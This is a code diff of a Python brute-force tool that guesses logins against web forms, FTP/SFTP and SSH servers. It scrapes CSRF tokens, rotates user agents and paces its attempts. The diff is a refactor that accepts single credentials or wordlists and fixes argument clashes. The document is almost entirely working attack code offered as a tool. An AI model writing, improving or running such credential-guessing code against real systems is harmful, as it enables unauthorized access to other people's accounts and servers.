@@ -1,5 +1,4 @@
 import argparse
-import json
 import requests
 from fake_useragent import UserAgent
 from bs4 import BeautifulSoup
@@ -13,14 +12,7 @@ import pysftp
 # Set up logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-def http_brute_force(url, username_file, password_file, request_delay):
-    # Read usernames and passwords into lists
-    with open(username_file, "r") as f:
-        usernames = f.read().splitlines()
-
-    with open(password_file, "r") as f:
-        passwords = f.read().splitlines()
-
+def http_brute_force(url, usernames, passwords, request_delay):
     # User-agent generator
     ua = UserAgent()
 
@@ -36,7 +28,7 @@ def http_brute_force(url, username_file, password_file, request_delay):
 
     # Find form field names
     fields = form.find_all("input")
-    field_names = [field.get("name") for field in fields]
+    field_names = [field.get("name") for field in fields if field.get("name")]
 
     # Find CSRF token or other hidden fields
     token_name = None
@@ -66,7 +58,7 @@ def http_brute_force(url, username_file, password_file, request_delay):
             data[token_name] = token_value
         if captcha_name and captcha_value:
             data[captcha_name] = captcha_value
-        
+
         try:
             response = requests.post(url, data=data, headers=headers)
             if "Başarısız" not in response.text and "Failed" not in response.text:
@@ -91,13 +83,7 @@ def http_brute_force(url, username_file, password_file, request_delay):
     thread.start()
     thread.join()
 
-def ftp_brute_force(host, username_file, password_file, port=21, request_delay=5):
-    with open(username_file, "r") as f:
-        usernames = f.read().splitlines()
-
-    with open(password_file, "r") as f:
-        passwords = f.read().splitlines()
-
+def ftp_brute_force(host, usernames, passwords, port=21, request_delay=5):
     def try_login(username, password):
         try:
             with pysftp.Connection(host, username=username, password=password, port=port) as sftp:
@@ -114,13 +100,7 @@ def ftp_brute_force(host, username_file, password_file, port=21, request_delay=5
                 return
             time.sleep(request_delay)
 
-def ssh_brute_force(host, username_file, password_file, port=22, request_delay=5):
-    with open(username_file, "r") as f:
-        usernames = f.read().splitlines()
-
-    with open(password_file, "r") as f:
-        passwords = f.read().splitlines()
-
+def ssh_brute_force(host, usernames, passwords, port=22, request_delay=5):
     def try_login(username, password):
         try:
             ssh = paramiko.SSHClient()
@@ -148,20 +128,40 @@ def main():
     parser.add_argument('--http', action='store_true', help='Use HTTP brute force')
     parser.add_argument('--ftp', action='store_true', help='Use FTP brute force')
     parser.add_argument('--ssh', action='store_true', help='Use SSH brute force')
-    parser.add_argument('-u', '--username-file', required=True, help='Path to the username file')
-    parser.add_argument('-P', '--password-file', required=True, help='Path to the password file')
-    parser.add_argument('-h', '--host', required=True, help='Target host')
+    parser.add_argument('-u', '--username', help='Single username')
+    parser.add_argument('-U', '--username-file', help='Path to the username file')
+    parser.add_argument('-p', '--password', help='Single password')
+    parser.add_argument('-P', '--password-file', help='Path to the password file')
+    parser.add_argument('-H', '--host', required=True, help='Target host')
     parser.add_argument('-d', '--delay', type=int, default=5, help='Request delay in seconds')
     parser.add_argument('--port', type=int, help='Port number')
 
     args = parser.parse_args()
 
+    usernames = []
+    passwords = []
+
+    if args.username:
+        usernames.append(args.username)
+    if args.username_file:
+        with open(args.username_file, 'r') as f:
+            usernames.extend(f.read().splitlines())
+
+    if args.password:
+        passwords.append(args.password)
+    if args.password_file:
+        with open(args.password_file, 'r') as f:
+            passwords.extend(f.read().splitlines())
+
+    if not usernames or not passwords:
+        parser.error("At least one username and one password must be provided.")
+
     if args.http:
-        http_brute_force(args.host, args.username_file, args.password_file, args.delay)
+        http_brute_force(args.host, usernames, passwords, args.delay)
     elif args.ftp:
-        ftp_brute_force(args.host, args.username_file, args.password_file, port=args.port or 21, request_delay=args.delay)
+        ftp_brute_force(args.host, usernames, passwords, port=args.port or 21, request_delay=args.delay)
     elif args.ssh:
-        ssh_brute_force(args.host, args.username_file, args.password_file, port=args.port or 22, request_delay=args.delay)
+        ssh_brute_force(args.host, usernames, passwords, port=args.port or 22, request_delay=args.delay)
     else:
         parser.print_help()
 
